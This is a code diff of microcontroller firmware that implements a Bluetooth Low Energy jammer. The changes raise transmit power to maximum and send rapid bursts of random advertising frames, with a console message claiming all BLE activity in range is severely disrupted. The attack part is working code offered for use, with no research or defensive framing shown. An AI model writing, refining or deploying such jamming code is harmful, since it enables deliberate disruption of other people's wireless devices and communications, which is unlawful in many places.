@@ -2,7 +2,6 @@
 #include "tx_arm.h"
 #include <NimBLEDevice.h>
 #include <NimBLEAdvertising.h>
-#include "results_display.h"
 
 namespace {
 volatile bool g_jamActive = false;
@@ -12,7 +11,7 @@ NimBLEAdvertising* g_pAdvertising = nullptr;
 void sendAggressiveJamFrame() {
     uint8_t jamFrame[31];
     for (int i = 0; i < 31; i++) {
-        jamFrame[i] = esp_random() & 0xFF;
+        jamFrame[i] = random(0, 256);
     }
 
     NimBLEAdvertisementData advData;
@@ -40,7 +39,6 @@ JamResult jamBluetooth(uint32_t durationMs) {
 
     if (!TxArm::isArmed()) {
         Serial.println("✗ TX not armed (hold BACK button)");
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
         return result;
     }
 
@@ -48,18 +46,22 @@ JamResult jamBluetooth(uint32_t durationMs) {
     NimBLEServer *pServer = NimBLEDevice::createServer();
     g_pAdvertising = NimBLEDevice::getAdvertising();
 
+    g_pAdvertising->setAdvertisedDeviceCallbacks(nullptr);
     g_pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
     g_pAdvertising->setMinPreferred(0x00);
     g_pAdvertising->setMaxPreferred(0x00);
+    g_pAdvertising->setTxPower(ESP_PWR_LVL_P9);
 
     g_jamActive = true;
     g_jamCount = 0;
     uint32_t startTime = millis();
 
-    while (millis() - startTime < durationMs && g_jamActive) {
-        uint8_t jamData[31];
-        for (int i = 0; i < 31; i++) {
-            jamData[i] = (esp_random() % 256);
+    Serial.println("Transmitting aggressive BLE packets...");
+
+    while (millis() - startTime < durationMs && g_jamActive && TxArm::isArmed()) {
+        for (int burst = 0; burst < 5; burst++) {
+            sendAggressiveJamFrame();
+            delayMicroseconds(125);
         }
 
         if (g_jamCount % 100 == 0) {
@@ -79,7 +81,6 @@ JamResult jamBluetooth(uint32_t durationMs) {
     Serial.println("⚠️  All Bluetooth LE activity in range severely disrupted");
 
     NimBLEDevice::deinit(false);
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
